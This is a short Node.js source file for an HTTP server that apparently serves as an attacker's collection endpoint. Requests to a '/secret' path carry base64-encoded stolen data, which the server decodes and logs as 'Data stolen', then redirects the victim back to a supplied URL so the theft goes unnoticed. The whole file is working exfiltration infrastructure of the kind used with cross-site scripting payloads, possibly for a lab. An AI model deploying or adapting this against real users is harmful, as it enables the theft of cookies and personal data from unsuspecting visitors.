const http = require('http');
const url = require('url');

const server = http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const pathname = parsedUrl.pathname;    

    if (pathname.startsWith('/secret')) {        
        let arr = parsedUrl.path.split('/')
        let payload = atob(arr[2])
        let redirect = atob(arr[3]) 
        console.log('Data stolen : ' + payload);        

        if (redirect !== 'none') {            
            console.log('redirecting back to ' + redirect + '..');
            res.writeHead(301, { 'Location': redirect });
            res.end();
            return;            
        }               
    }   
});

const PORT = 3000;
server.listen(PORT, () => {
    console.log(`Server is running on http://127.0.0.1:${PORT}`);
});
